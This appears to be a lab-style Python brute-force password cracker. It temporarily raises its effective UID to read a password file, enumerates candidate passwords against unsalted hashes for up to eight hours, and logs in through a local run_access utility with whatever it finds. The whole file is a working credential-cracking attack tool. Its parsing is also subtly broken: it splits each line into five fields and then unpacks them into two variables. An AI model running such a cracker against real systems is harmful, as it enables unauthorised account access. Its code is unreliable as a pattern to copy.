#!/usr/bin/env python3
import os
import sys
import time
import hashlib
import itertools
import subprocess
from config import PASSWD_FILE, HASH_ALGO, PASSWORD_ALPHABET, FIRST_CHAR_ALPHABET

# 8 hours 
MAX_BRUTE_TIME_SEC = 8 * 3600

_SAVED_EUID = None

# Temporarily raise EUID to owner of passwd file (root) to read it.
def elevate():
    global _SAVED_EUID
    if _SAVED_EUID is not None:
        return
    try:
        st = os.stat(PASSWD_FILE)
    except OSError:
        return
    target_euid = st.st_uid
    if os.geteuid() == target_euid:
        return
    _SAVED_EUID = os.geteuid()
    try:
        os.seteuid(target_euid)
    except PermissionError:
        _SAVED_EUID = None

# Restore EUID back to original value.
def drop():
    global _SAVED_EUID
    if _SAVED_EUID is None:
        return
    try:
        os.seteuid(_SAVED_EUID)
    finally:
        _SAVED_EUID = None

def hash_password(password):
    h = hashlib.new(HASH_ALGO)
    h.update(password.encode('utf-8'))
    return h.hexdigest() # hash (passw)

# Read passwd file and return map {login: hash} (elevate/drop like in access.py)
def read_passwd():
    users = {}
    elevate()
    try:
        if not os.path.exists(PASSWD_FILE):
            return users
        with open(PASSWD_FILE, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                parts = line.split(':', 4)
                if len(parts) != 5:
                    continue
                login, pwd_hash = parts
                users[login] = pwd_hash
    finally:
        drop()
    return users # {login : hash}

# Count for L = 52 * 72^{L-1}
def max_iterations_for_length(length):
    if length < 1:
        return 0
    n_first = len(FIRST_CHAR_ALPHABET)
    n_rest = len(PASSWORD_ALPHABET)
    return n_first * (n_rest ** (length - 1))

# From 1 to L = Sum L
def total_max_iterations_up_to(max_length):
    return sum(max_iterations_for_length(L) for L in range(1, max_length + 1))

# from 1-8 
def generate_passwords(max_length):
    for length in range(1, max_length + 1):
        if length == 1:
            for ch in FIRST_CHAR_ALPHABET: # [a-zA-Z]
                yield ch
        else:
            for first in FIRST_CHAR_ALPHABET: # forall [a-zA-Z].join([a-zA-Z0-9!@£$%^&*()_+])
                for rest in itertools.product(PASSWORD_ALPHABET, repeat=length - 1):
                    yield first + ''.join(rest)


# Call run_access utility with login and password
def call_run_access(login, password):
    try:
        # Prepare input for interactive access.py: login and enter key, password and enter key, exit and enter key
        stdin_input = f"{login}\n{password}\nexit\n"
        result = subprocess.run(
            ["./run_access"],
            input=stdin_input,
            capture_output=True,
            text=True,
            timeout=10
        )
        print("\n=== Calling run_access ===")
        print(f"Login: {login}")
        print(f"Password: {password}")
        print("Output:")
        if result.stdout:
            print(result.stdout)
        if result.stderr:
            print("Stderr:", result.stderr)
        return True
    except subprocess.TimeoutExpired:
        print("run_access timeout")
        return False
    except Exception as e:
        print(f"Error calling run_access: {e}")
        return False

# Statistics
def brute_force(login, target_hash, max_length):
    total_attempts = 0
    start_time = time.time()
    for password in generate_passwords(max_length):
        if time.time() - start_time > MAX_BRUTE_TIME_SEC:
            elapsed = time.time() - start_time
            return None, total_attempts, elapsed, True  # timeout
        total_attempts += 1
        if hash_password(password) == target_hash:
            elapsed = time.time() - start_time
            return password, total_attempts, elapsed, False
    elapsed = time.time() - start_time
    return None, total_attempts, elapsed, False

def main():
    if len(sys.argv) < 2:
        print("use:")
        print("crack.py LOGIN LENGHT - Permutation")
        print("crack.py --max-iterations - max iterations for 3-8")
        sys.exit(1)

    if sys.argv[1] == "--max-iterations":
        print("Max iterations by length:")
        print("Length , For Length , Sum from 1...L)")
        print("-" * 10)
        for L in range(3, 9):
            m = max_iterations_for_length(L)
            total = total_max_iterations_up_to(L)
            print(f"{L}, {m}, {total}")
        sys.exit(0)

    if len(sys.argv) != 3:
        print("use: crack.py <login> <length>")
        sys.exit(1)

    login = sys.argv[1]
    try:
        max_length = int(sys.argv[2])
    except ValueError:
        print("Should be > 0")
        sys.exit(1)

    try:
        users = read_passwd()
    except (PermissionError, OSError) as e:
        print(f"Error: {e}")
        sys.exit(1)
    if login not in users:
        print(f"User {login} not found")
        sys.exit(1)

    target_hash = users[login]
    max_iter = total_max_iterations_up_to(max_length)
    print(f"Generating for login {login}, max length: {max_length}")
    print(f"(In theory): iterations (1..{max_length}): {max_iter}")
    found, attempts, elapsed, timeout = brute_force(login, target_hash, max_length)

    if timeout:
        print("Interupt: more than 8 hours")
    if found:
        print(f"Yes! Found password: {found}")
        print(f"Count of attempts: {attempts}")
        print(f"Time spended: {elapsed:.2f} s ({elapsed / 3600:.2f} H)")
        # Call run_access utility with found credentials
        call_run_access(login, found)
    else:
        print(f"Not found with {attempts} attempts")
        print(f"Time spended: {elapsed:.2f} s ({elapsed / 3600:.2f} H)")

if __name__ == "__main__":
    main()